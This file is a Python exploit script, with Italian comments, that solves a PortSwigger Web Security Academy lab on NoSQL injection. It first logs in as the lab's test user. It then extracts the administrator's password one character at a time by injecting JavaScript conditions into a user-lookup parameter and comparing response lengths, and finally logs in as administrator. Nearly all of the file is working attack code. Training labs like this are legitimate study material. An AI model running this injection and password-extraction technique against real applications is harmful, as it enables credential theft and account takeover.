"""
    RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
"""
import sys
from base_exploit import BaseNoSQLExploit, print_error, print_success, print_info

# ==================== CONFIGURAZIONE ====================
LAB_ID = "INSERT_YOUR_LAB_ID_HERE"
BASE_URL = f"https://{LAB_ID}.web-security-academy.net"

# ==================== COSTANTI ====================
LOOKUP_ENDPOINT = "/user/lookup"
EMPTY_RESPONSE_THRESHOLD = 38  # Threshold per risposta vuota (da analisi ZAProxy)
CHARSET = "abcdefghijklmnopqrstuvwxyz"
PASSWORD_LENGTH_RANGES = [(1, 10), (10, 20), (20, 30), (30, 40)]

# ==================== EXPLOIT CLASS ====================
class InjToExtractData(BaseNoSQLExploit):
    """Exploit per NoSQL Injection Data Extraction."""
    
    def __init__(self, lab_id):
        super().__init__(lab_id)
        self.password = ""
        
    def check_lab_status(self):
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code == 200:
                print_success(f"Lab raggiungibile: {self.base_url}")
                return True
            else:
                print_error(f"Lab non raggiungibile (Status: {response.status_code})")
                return False
        except Exception as e:
            print_error(f"Errore connessione: {e}")
            return False
    
    def _get_csrf_token(self, url):
        """Estrae il token CSRF da una pagina."""
        import re
        try:
            response = self.session.get(url, timeout=10)
            csrf_match = re.search(r'name="csrf" value="([^"]+)"', response.text)
            return csrf_match.group(1) if csrf_match else ""
        except Exception as e:
            print_error(f"Errore estrazione CSRF token: {e}")
            return ""
    
    def login(self, username="wiener", password="peter"):
        """Effettua il login per ottenere una sessione valida."""
        print_info(f"\nLogin con {username}:{password}")
        
        # Ottieni token CSRF dalla pagina di login
        csrf_token = self._get_csrf_token(self.login_url)
        
        login_data = {
            "csrf": csrf_token,
            "username": username,
            "password": password
        }
        
        response = self.session.post(
            self.login_url,
            data=login_data,
            allow_redirects=True,
            timeout=10
        )
        
        if response.status_code == 200 and "Your username is:" in response.text:
            print_success(f"Login effettuato con successo!")
            return True
        else:
            print_error(f"Login fallito")
            return False
    
    def _test_password_condition(self, username, condition):
        """Testa una condizione sulla password tramite NoSQL injection.
        
        Returns:
            bool: True se la condizione è soddisfatta (risposta non vuota)
        """
        payload = f"{username}' & {condition} || 'a'=='b"
        params = {"user": payload}
        
        try:
            response = self.session.get(
                f"{self.base_url}{LOOKUP_ENDPOINT}",
                params=params,
                timeout=10
            )
            # Risposta > threshold indica condizione vera (da analisi ZAProxy)
            return response.status_code == 200 and len(response.text) > EMPTY_RESPONSE_THRESHOLD
        except Exception as e:
            print_error(f"Errore durante test condizione: {e}")
            return False
    
    def check_password_length(self, username="administrator"):
        """Determina la lunghezza della password usando binary search su range."""
        print_info(f"\nRicerca lunghezza password per {username}")
        
        # Ricerca binaria per trovare il range corretto
        for range_start, range_end in PASSWORD_LENGTH_RANGES:
            condition = f"this.password.length < {range_end}"
            
            if self._test_password_condition(username, condition):
                print_info(f"Lunghezza password < {range_end}, ricerca in range {range_start}-{range_end-1}")
                
                # Ricerca esatta nel range (dal più alto al più basso)
                for length in range(range_end - 1, range_start - 1, -1):
                    condition = f"this.password.length == {length}"
                    
                    if self._test_password_condition(username, condition):
                        print_success(f"Lunghezza password trovata: {length}")
                        return length
        
        print_error("Impossibile determinare la lunghezza della password")
        return None
    
    def extract_password(self, username="administrator", length=None):
        """Estrae la password carattere per carattere usando NoSQL injection."""
        if length is None:
            length = self.check_password_length(username)
            if length is None:
                return None
        
        print_info(f"\nEstrazione password per {username} (lunghezza: {length})")
        
        password = ""
        
        for position in range(length):
            found = False
            print_info(f"\nRicerca carattere in posizione {position}")
            
            # Prova ogni carattere del charset
            for char in CHARSET:
                condition = f"this.password[{position}] == '{char}'"
                
                if self._test_password_condition(username, condition):
                    password += char
                    print_success(f"Carattere trovato: {char} -> Password parziale: {password}")
                    found = True
                    break
            
            if not found:
                print_error(f"Carattere in posizione {position} non trovato")
                return None
        
        print_success(f"\nPASSWORD COMPLETA ESTRATTA: {password}")
        return password
    
    def solve_lab(self, extracted_password):
        """Effettua il login come administrator per completare il lab."""
        print_info(f"\nLogin come administrator con password: {extracted_password}")
        
        # Ottieni nuovo CSRF token usando metodo della classe base
        csrf_token = self.get_csrf_token(self.login_url)
        
        login_data = {
            "csrf": csrf_token,
            "username": "administrator",
            "password": extracted_password
        }
        
        response = self.session.post(
            self.login_url,
            data=login_data,
            allow_redirects=True,
            timeout=10
        )
        
        if response.status_code == 200 and "administrator" in response.text.lower():
            print_success(f"Login come administrator riuscito!")
            print_success(f"Lab completato!")
            return True
        else:
            print_error(f"Login come administrator fallito")
            return False
   
def main():
    """Funzione principale per l'esecuzione dell'exploit."""
    # Validazione configurazione
    if not BaseNoSQLExploit.validate_lab_id(LAB_ID):
        sys.exit(1)
    
    exploit = InjToExtractData(LAB_ID)
    
    # Verifica connettività
    if not exploit.check_lab_status():
        sys.exit(1)
    
    # FASE 1: Login come wiener per ottenere una sessione valida
    if not exploit.login("wiener", "peter"):
        print_error("Impossibile effettuare il login")
        sys.exit(1)
    
    # FASE 2: Estrai la password dell'administrator tramite NoSQL injection
    password = exploit.extract_password("administrator")
    
    if password:
        # FASE 3: Login come administrator per completare il lab
        exploit.solve_lab(password)
    else:
        print_error("Impossibile estrarre la password")
        sys.exit(1)


if __name__ == "__main__":
    main()